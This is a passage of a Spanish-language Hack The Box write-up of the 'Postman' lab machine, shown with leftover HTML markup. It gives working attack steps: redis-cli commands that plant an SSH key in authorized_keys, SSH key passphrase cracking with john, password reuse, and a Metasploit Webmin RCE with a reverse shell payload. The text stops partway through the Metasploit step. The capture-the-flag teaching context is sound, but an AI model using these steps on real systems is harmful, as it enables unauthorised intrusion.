Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.160
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.26s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65213&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;318&lt;/span&gt; filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Thu Dec 26 14:45:40 2019 -- 1 IP address (1 host up) scanned in 191.74 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Thu Dec 26 14:46:53 2019 as: nmap -sV -sC -p22,80,6379,10000 -o postman_nmap_v 10.10.10.160&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.160
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp    open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: The Cyber Geek&lt;span class=&#34;s1&#34;&gt;&amp;#39;s Personal Website
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;6379/tcp  open  redis   Redis key-value store 4.0.9
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|_http-title: Site doesn&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;Charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;iso-8859-1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Thu Dec 26 14:47:36 2019 -- 1 IP address (1 host up) scanned in 43.58 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http-puerto-80&#34;&gt;HTTP (Puerto 80)&lt;/h2&gt;
&lt;p&gt;En el puerto 80 nos muestra una pagina que al parecer esta en construccion.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-26_14-51-45.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;puerto-6379&#34;&gt;PUERTO 6379&lt;/h2&gt;
&lt;p&gt;En el puerto 6379 nos muestra un mensaje de error.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-26_14-52-29.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;puerto-10000&#34;&gt;PUERTO 10000&lt;/h2&gt;
&lt;p&gt;En este puerto nos muestra un mensaje de error en el cual nos dice que probemos en el protocolo https.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-26_14-54-20.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Cambiamos a https y nos muestra un panel de Webmin.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-26_14-55-04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster---puerto-80&#34;&gt;GOBUSTER - Puerto 80&lt;/h3&gt;
&lt;p&gt;Encontramos algunos directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/postman# gobuster dir -u http://10.10.10.160/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -q
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/fonts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/upload &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;redis-puerto-6379&#34;&gt;REDIS PUERTO 6379&lt;/h3&gt;
&lt;p&gt;Como vimos en el reporte de nmap este puerto esta corriendo un servicio de &lt;code&gt;redis 4.0.9&lt;/code&gt;. Al intentar conectarnos con el servicio mediante &lt;em&gt;redis-tools&lt;/em&gt; podemos obtener informacion del mismo.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-27_17-12-36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;redis---explotacion&#34;&gt;REDIS - Explotacion&lt;/h2&gt;
&lt;p&gt;Utilizando los comandos de redis podemos obtener informacion del directorio donde esta corriendo o esta siendo utilizado por redis, tambien el nombre del archivo (dbfilename).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-27_17-19-24.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos que la configuracion del &lt;code&gt;dbfilename&lt;/code&gt; es dump.rdb y el directorio esta ubicado en &lt;code&gt;/var/lib/redis&lt;/code&gt;, para obtener acceso a la maquina mediante redis vamos a sobrescribir la configuracion, agregando el dbfilename como &lt;code&gt;authorized_keys&lt;/code&gt; donde vamos a escribir nuestra clave publica de ssh y dir como &lt;code&gt;/var/lib/redis/.ssh&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;redis-ssh&#34;&gt;REDIS SSH&lt;/h3&gt;
&lt;p&gt;Generamos nuestra clave publica con &lt;strong&gt;ssh-keygen&lt;/strong&gt; la cual vamos a utilizar para iniciar sesion en el servicio ssh.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-27_17-13-14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Antes de configurar redis debemos de agregar saltos de linea antes y despues en nuevo archivo agregando nuestra clave publica.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;\n\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; cat id_rsa.pub&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;\n\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; clave_publica.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-27_17-47-35.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos redis-cli localmente para agregar la configuracion que necesitamos a la maquina, con los comandos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Configuracion dir&lt;/span&gt;
redis-cli -h 10.10.10.160
config &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; dir /var/lib/redis/.ssh
config get dir

&lt;span class=&#34;c1&#34;&gt;#Configuracion dbfilename&lt;/span&gt;
config &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; dbfilename authorized_keys
config get dbfilename
SLAVEOF NO ONE
save

&lt;span class=&#34;c1&#34;&gt;#Escritura de clave publica en nuestra key&lt;/span&gt;
cat clave_publica.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; redis-cli -h 10.10.10.160 -x &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; s-key
get s-key
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-28_16-43-27.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Verificamos que nuestra clave publica se haya escrito en nuestra key (s-key):&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-28_16-44-01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizando nuestra clave privada iniciamos sesion con el usuario redis:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-28_16-45-04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos el historial del usuario redis, encontramos que el usuario edito un archivo de python y un archivo de &lt;strong&gt;id_rsa.bak&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-28_16-46-02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Archivo id_rsa.bak:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-28_16-47-05.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---matt&#34;&gt;USER - Matt&lt;/h2&gt;
&lt;p&gt;Utilizando la clave privada con el usuario Matt con ssh nos pregunta por la frase.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-28_16-57-47.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos ssh2john para obtener el hash del archivo y junto con john the ripper crackear la frase de la clave privada.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python ssh2john.py id_rsa_matt &amp;gt; id_rsa_matt.hash
john --format&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;SSH --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt id_rsa_matt.hash
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-28_16-59-48.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;FRASE: &lt;code&gt;computer2008&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos la frase pero al intentar utilizarla con la clave privada no nos permite iniciars sesion.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-28_17-01-37.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos la misma frase como contraseña de Matt y con el comando su, obtuvimos una shell con el usuario Matt y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-28_17-01-07.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Flag:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-28_17-03-29.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Utilizamos las credenciales de Matt en el puerto 10000 o webmin panel, exitosamente logramos iniciar sesion.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-29_22-39-02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;La version de webmin menores o iguales a 1.910 tienen una vulnerabilidad (&lt;strong&gt;CVE:2019-12840&lt;/strong&gt;) que permite la ejecucion de comandos, configuramos metasploit con el cve, añadimos las credenciales de Matt y utilizamos SSL.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-28_17-09-59.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;98
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 &amp;gt; search 2019-12840 

Matching &lt;span class=&#34;nv&#34;&gt;Modules&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;================&lt;/span&gt;

   &lt;span class=&#34;c1&#34;&gt;#  Name                                     Disclosure Date  Rank       Check  Description&lt;/span&gt;
   -  ----                                     ---------------  ----       -----  -----------
   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  exploit/linux/http/webmin_packageup_rce  2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution


msf5 &amp;gt; use exploit/linux/http/webmin_packageup_rce
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;linux/http/webmin_packageup_rce&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; 
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;linux/http/webmin_packageup_rce&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options 

Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;exploit/linux/http/webmin_packageup_rce&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;,type:host:port&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
   RHOSTS                      yes       The target host&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, range CIDR identifier, or hosts file with syntax &lt;span class=&#34;s1&#34;&gt;&amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;&lt;/span&gt;
   RPORT      &lt;span class=&#34;m&#34;&gt;10000&lt;/span&gt;            yes       The target port &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TCP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   SSL        &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;            no        Negotiate SSL/TLS &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; outgoing connections
   TARGETURI  /                yes       Base path &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; Webmin application
   USERNAME                    yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;cmd/unix/reverse_perl&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   LPORT  &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   Webmin &amp;lt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 1.910


